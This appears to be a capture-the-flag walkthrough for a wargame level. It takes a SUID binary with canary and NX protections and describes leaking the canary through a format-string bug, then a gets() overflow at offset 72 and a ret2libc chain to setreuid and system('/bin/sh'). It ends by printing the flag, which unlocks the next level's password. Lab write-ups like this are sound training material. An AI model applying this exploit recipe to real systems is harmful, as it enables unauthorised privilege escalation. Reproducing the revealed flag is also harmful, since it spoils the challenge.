# level10 — walkthrough (BOSS)

**Binary:** `/home/level10/tessier` (SUID `flag10`, x86-64) — **no source**
**Goal:** read `/home/flag10/.pass`

## Recon
```
checksec: No PIE (0x400000), NX ON, stack canary, RELRO, ASLR off.
main: init_vault(); init_sessions(); print_banner(); format_log(); authenticate();
```
The "boss" is meant to combine every mitigation — leak past a canary, then ROP
under NX. On this box **ASLR is off**, so the fixed libc turns it into the same
recipe as level06/09.

## Bugs
* `format_log`: `fgets(buf,0x20); ...; printf(buf);` → format string, leaks the
  **canary** at `%11$` (the 32-byte buffer keeps the format short — `%11$p`).
* `authenticate`: `gets(buf@rbp-0x50)` → overflow, `buf[0x48]` is the canary
  (**offset 72**). The `strncmp(buf,"TA_ROOT_",8)` auth check is a decoy; the
  overwritten return address runs our chain once the canary passes.

## Exploit
1. Send `%11$p` → canary.
2. Overflow: `['A'*72][canary]['A'*8][ret2libc]`.
3. Chain: `setreuid(1027,1027)` + `system("/bin/sh")` (movaps-aligned), command
   fed on stdin. Leak+overflow in one process so the canary matches.

## Run
```
python3 exploit.py
-> 6lhi9nnjkxeye0p1jh1qniao8e89f4mq
```

**flag10 = `6lhi9nnjkxeye0p1jh1qniao8e89f4mq`** (unlocks the bonus track — SSH
password for `bonus01`)
